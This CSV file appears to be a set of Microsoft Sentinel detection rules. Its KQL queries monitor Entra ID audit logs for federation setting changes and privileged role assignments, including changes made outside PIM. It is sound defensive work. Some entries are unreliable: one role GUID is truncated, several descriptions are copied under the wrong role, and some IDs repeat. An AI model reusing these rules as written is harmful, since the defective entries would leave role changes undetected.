,title,description,detectType,detectCon,detectLanguage,tags,attackTechnique,attackSoftware,references,pattern,dataSource,dataType,dataCollector,dataForwardTo,dataparser,dataParser,dataStorage,dataTable,dataIndex,dataAccess,dataMap,kqlVar,kqlTable,kqlQuery
1,,[None],,,,[None],,,[None],[None],,,,,,,,,,,,,,
2,rolemgt_pid_0001_any_global_admin,['user or app modifies federation settings in the tenant'],,3,kql,[None],['t1098.003'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,directory_management,api_azure_monitor,,,AuditLogs,"| where OperationName =~ ""Set federation settings on domain""
  or OperationName =~ ""Set domain authentication"""
3,rolemgt_pid_0011_any_auth_extension_admin,"['Any Entra ID Auth Extension Admin Role Add, Remove, or Modify Activity', 'Customize sign in and sign up experiences for users by creating and managing custom authentication extensions']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '25a516ed-2fa0-40ea-a2d0-12923a21473a'"
4,rolemgt_pid_0053_any_security_reader,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports in Microsoft Entra ID and Office 365']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5d6b6bb7-de71-4623-b4af-96380a352509'"
5,rolemgt_pid_0050_any_security_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports, and manage configuration in Microsoft Entra ID and Office 365', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '194ae4cb-b126-40b2-bd5b-6091b380977d'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
6,rolemgt_pid_0046_any_priv_auth_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any user (admin or non-admin).', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7be44c8a-adaf-4e2a-84d6-ab2649e08a13'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
7,rolemgt_pid_0020_any_cloudapp_admin_not_pim,"['Any Entra ID Cloud App Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps except application proxy', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '158c047a-c907-4556-b7ef-446551a6b5f7'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
8,rolemgt_pid_0012_any_auth_extension_admin_not_pim,"['Any Entra ID Auth Extension Admin Role Add, Remove, or Modify Activity', 'Customize sign in and sign up experiences for users by creating and managing custom authentication extensions', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '25a516ed-2fa0-40ea-a2d0-12923a21473a'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
9,rolemgt_pid_0049_any_security_operator,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Creates and manages security events.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5f2222b1-57c3-48ba-8ad5-d4759f1fde6f'"
10,rolemgt_pid_0042_any_intune_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Intune product.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '3a2c62db-5318-420d-8d74-23affee5d9d5'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
11,rolemgt_pid_0040_any_hybrid_id_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Active Directory to Microsoft Entra cloud provisioning, Microsoft Entra Connect, Pass-through Authentication (PTA), Password hash synchronization (PHS), Seamless Single sign-on (Seamless SSO), and federation settings.', 'Does not have access to manage Microsoft Entra Connect Health.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
12,rolemgt_pid_0032_any_exchange_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Exchange product', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '29232cdf-9323-42fd-ade2-1d097af3e4de'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
13,rolemgt_pid_0025_any_directory_reader,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read basic directory information. Commonly used to grant directory read access to applications and guests']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '88d8e3e3-8f55-4a1e-953a-9b9898b8876b'"
14,rolemgt_pid_0054_any_security_reader_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports in Microsoft Entra ID and Office 365', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5d6b6bb7-de71-4623-b4af-96380a352509'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
15,rolemgt_pid_0027_any_directory_writer,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read and write basic directory information. For granting access to applications, not intended for users.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '9360feb5-f418-4baa-8175-e2a00bac4301'"
16,rolemgt_pid_0036_any_groups_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Members of this role can create/manage groups, create/manage groups settings like naming and expiration policies, and view groups activity and audit reports.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fdd7a751-b60b-444a-984c-02652fe8fa1c'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
17,rolemgt_pid_0017_any_cloudapp_security_admin,"['Any Entra ID Cloud App Security Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Defender for Cloud Apps product.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '892c5842-a9a6-463a-8041-72aa08ca3cf6'"
18,rolemgt_pid_0052_any_security_operator_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Creates and manages security events.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5f2222b1-57c3-48ba-8ad5-d4759f1fde6f'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
19,rolemgt_pid_0026_any_directory_reader_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read basic directory information. Commonly used to grant directory read access to applications and guests', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '88d8e3e3-8f55-4a1e-953a-9b9898b8876b'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
20,rolemgt_pid_0031_any_exchange_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Exchange product']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '29232cdf-9323-42fd-ade2-1d097af3e4de'"
21,rolemgt_pid_0022_any_cloud_device_admin_not_pim,"['Any Entra ID Cloud Device Role Add, Remove, or Modify Activity', 'Limited access to manage devices in Microsoft Entra ID', 'PIM Exlcuded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7698a772-787b-4ac8-901f-60d6b08affd2'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
22,rolemgt_pid_0057_any_directory_sync,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Only used by Microsoft Entra Connect service.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'd29b2b05-8046-44ba-8758-1e26182fcf32'"
23,rolemgt_pid_0007_any_auth_admin,"['Any Entra ID Auth Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any non-admin user.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'c4e39bd9-1100-46d3-8c65-fb160da0071f'"
24,rolemgt_pid_0033_any_global_reader,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read everything that a Global Administrator can, but not update anything.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'f2ef992c-3afb-46b9-b7cf-a126ee74c451'"
25,rolemgt_pid_0033_any_global_reader_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read everything that a Global Administrator can, but not update anything.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'f2ef992c-3afb-46b9-b7cf-a126ee74c451'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
26,rolemgt_pid_0028_any_directory_writer_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read and write basic directory information. For granting access to applications, not intended for users.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '9360feb5-f418-4baa-8175-e2a00bac4301'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
27,rolemgt_pid_0002_any_global_admin_not_pim,"['Any Entra ID Global Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of Microsoft Entra ID and Microsoft services that use Microsoft Entra identities', 'God Mode', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '62e90394-69f5-4237-9190-012177145e10'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
28,rolemgt_pid_00010_any_auth_policy_admin_not_pim,"['Any Entra ID Auth Policy Admin Role Add, Remove, or Modify Activity', 'Can create and manage the authentication methods policy, tenant-wide MFA settings, password protection policy, and verifiable credentials', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '0526716b-113d-4c15-b2c8-68e3c22b9f80'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
29,rolemgt_pid_0009_any_auth_policy_admin,"['Any Entra ID Auth Policy Admin Role Add, Remove, or Modify Activity', 'Can create and manage the authentication methods policy, tenant-wide MFA settings, password protection policy, and verifiable credentials']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '0526716b-113d-4c15-b2c8-68e3c22b9f80'"
30,rolemgt_pid_0049_any_security_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports, and manage configuration in Microsoft Entra ID and Office 365.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '194ae4cb-b126-40b2-bd5b-6091b380977d'"
31,rolemgt_pid_0044_any_password_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Password Administrators.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '966707d0-3269-4727-9be2-8c3a10f19b9d'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
32,rolemgt_pid_0029_any_domain_name_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage domain names in cloud and on-premises.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8329153b-31d0-4727-b945-745eb3bc5f31'"
33,rolemgt_pid_0014_any_fed_keyset_admin,"['Any Entra IEF ID Auth Admin Role Add, Remove, or Modify Activity', 'Can manage secrets for federation and encryption in the Identity Experience Framework (IEF)', 'PIM Exclued']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'aaf43236-0c0d-4d5f-883a-6955382ac081'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
34,rolemgt_pid_0030_any_domain_name_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage domain names in cloud and on-premises.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8329153b-31d0-4727-b945-745eb3bc5f31'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
35,rolemgt_pid_0016_any_billing_admin_not_pim,"['Any Entra ID Billing Admin Role Add, Remove, or Modify Activity', 'Can perform common billing related tasks like updating payment information', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b0f54661-2d74-4c50-afa3-1ec803f12efe'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
36,rolemgt_pid_0045_any_priv_auth_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any user (admin or non-admin).']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7be44c8a-adaf-4e2a-84d6-ab2649e08a13'"
37,rolemgt_pid_0006_any_app_admin_not_pim,"['Any Entra ID App Developer Admin Role Add, Remove, or Modify Activity', ""Can create application registrations independent of the 'Users can register applications' setting"", 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'cf1c38e5-3621-4004-a7cb-879624dced7c'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
38,rolemgt_pid_0047_any_priv_role_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Entra ID, and all aspects of Privileged Identity Management']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'e8611ab8-c189-46e8-94e1-60213ab1f814'"
39,rolemgt_pid_0001_any_global_admin,"['Any Entra ID Global Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of Microsoft Entra ID and Microsoft services that use Microsoft Entra identities.', 'God Mode']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '62e90394-69f5-4237-9190-012177145e10'"
40,rolemgt_pid_0055_any_user_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of users and groups, including resetting passwords for limited admins.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fe930be7-5e62-47db-91af-98c3a49a38b1'"
41,rolemgt_pid_0021_any_cloud_device_admin,"['Any Entra ID Cloud Device Role Add, Remove, or Modify Activity', 'Limited access to manage devices in Microsoft Entra ID.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7698a772-787b-4ac8-901f-60d6b08affd2'"
42,rolemgt_pid_0003_any_app_admin,"['Any Entra ID App Admin Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3'"
43,rolemgt_pid_0038_any_helpdesk_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Helpdesk Administrators.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '729827e3-9c14-49f7-bb1b-9608f156bbb8'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
44,rolemgt_pid_0005_any_app_dev,"['Any Entra ID App Developer Role Add, Remove, or Modify Activity', ""Can create application registrations independent of the 'Users can register applications' setting""]",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'cf1c38e5-3621-4004-a7cb-879624dced7c'"
45,rolemgt_pid_0019_any_cloudapp_admin,"['Any Entra ID Cloud App Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps except application proxy.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '158c047a-c907-4556-b7ef-446551a6b5f7'"
46,rolemgt_pid_0055_any_user_admin_pim_excluded,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of users and groups, including resetting passwords for limited admins.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fe930be7-5e62-47db-91af-98c3a49a38b1'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
47,rolemgt_pid_0041_any_intune_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Intune product.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '3a2c62db-5318-420d-8d74-23affee5d9d5'"
48,rolemgt_pid_0024_any_cap_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Conditional Access capabilities.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b1be1c3e-b65d-4f19-8427-f6fa0d97feb9'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
49,rolemgt_pid_0004_any_app_admin_not_pim,"['Any Entra ID App Admin Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
50,rolemgt_pid_0008_any_auth_admin_not_pim,"['Any Entra ID Auth Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any non-admin user', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'c4e39bd9-1100-46d3-8c65-fb160da0071f'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
51,rolemgt_pid_0058_any_tier_support,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Do not use - not intended for general use.']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '4ba39ca4-527c-499a-b93d-d9b492c50246'
  or TargetResources contains 'e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8'"
52,rolemgt_pid_0017_any_cloudapp_security_admin,"['Any Entra ID Cloud App Security Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Defender for Cloud Apps product', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '892c5842-a9a6-463a-8041-72aa08ca3cf6'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
53,rolemgt_pid_0037_any_helpdesk_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Helpdesk Administrators.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '729827e3-9c14-49f7-bb1b-9608f156bbb8'"
54,rolemgt_pid_0023_any_cap_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Conditional Access capabilities.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b1be1c3e-b65d-4f19-8427-f6fa0d97feb9'"
55,rolemgt_pid_0035_any_groups_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Members of this role can create/manage groups, create/manage groups settings like naming and expiration policies, and view groups activity and audit reports.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fdd7a751-b60b-444a-984c-02652fe8fa1c'"
56,rolemgt_pid_0015_any_billing_admin,"['Any Entra ID Billing Admin Role Add, Remove, or Modify Activity', 'Can perform common billing related tasks like updating payment information']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b0f54661-2d74-4c50-afa3-1ec803f12efe'"
57,rolemgt_pid_0039_any_hybrid_id_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Active Directory to Microsoft Entra cloud provisioning, Microsoft Entra Connect, Pass-through Authentication (PTA), Password hash synchronization (PHS), Seamless Single sign-on (Seamless SSO), and federation settings.', 'Does not have access to manage Microsoft Entra Connect Health.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2'"
